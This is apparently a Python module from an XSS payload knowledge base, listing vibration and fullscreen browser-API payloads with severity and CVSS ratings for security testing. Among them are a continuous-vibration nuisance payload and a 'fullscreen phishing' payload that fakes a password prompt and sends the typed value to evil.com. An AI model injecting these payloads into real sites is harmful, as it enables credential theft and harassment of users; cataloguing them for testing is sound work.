#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Miscellaneous API Payloads
"""

from ..models import PayloadEntry


VIBRATION_PAYLOADS = {
    "vibrate_1": PayloadEntry(
        payload="<script>navigator.vibrate(1000)</script>",
        contexts=["html_content", "javascript"],
        severity="low",
        cvss_score=3.0,
        description="Single vibration",
        tags=["vibration", "mobile"],
        reliability="medium",
    ),
    "vibrate_2": PayloadEntry(
        payload="<script>navigator.vibrate([100,50,100,50,100])</script>",
        contexts=["html_content", "javascript"],
        severity="low",
        cvss_score=3.0,
        description="Pattern vibration",
        tags=["vibration", "pattern", "mobile"],
        reliability="medium",
    ),
    "vibrate_3": PayloadEntry(
        payload="<script>setInterval(()=>navigator.vibrate(500),1000)</script>",
        contexts=["html_content", "javascript"],
        severity="low",
        cvss_score=4.0,
        description="Continuous vibration annoyance",
        tags=["vibration", "continuous", "dos"],
        reliability="medium",
    ),
}

FULLSCREEN_PAYLOADS = {
    "fullscreen_1": PayloadEntry(
        payload='<button onclick="document.documentElement.requestFullscreen()">Fullscreen</button>',
        contexts=["html_content"],
        severity="low",
        cvss_score=3.5,
        description="Fullscreen request",
        tags=["fullscreen", "request"],
        reliability="high",
    ),
    "fullscreen_2": PayloadEntry(
        payload="<script>document.onclick=()=>document.documentElement.requestFullscreen()</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=5.0,
        description="Click-triggered fullscreen",
        tags=["fullscreen", "click", "trick"],
        reliability="high",
    ),
    "fullscreen_3": PayloadEntry(
        payload='<div id=fs onclick="this.requestFullscreen();this.innerHTML=\'<h1>Enter your password</h1><input type=password><button onclick=fetch("//evil.com/?"+this.previousSibling.value)>Submit</button>\'">Click here</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Fullscreen phishing",
        tags=["fullscreen", "phishing"],
        reliability="medium",
    ),
}

# Combined database
MISC_API_DATABASE = {
    **VIBRATION_PAYLOADS,
    **FULLSCREEN_PAYLOADS,
}
MISC_API_TOTAL = len(MISC_API_DATABASE)
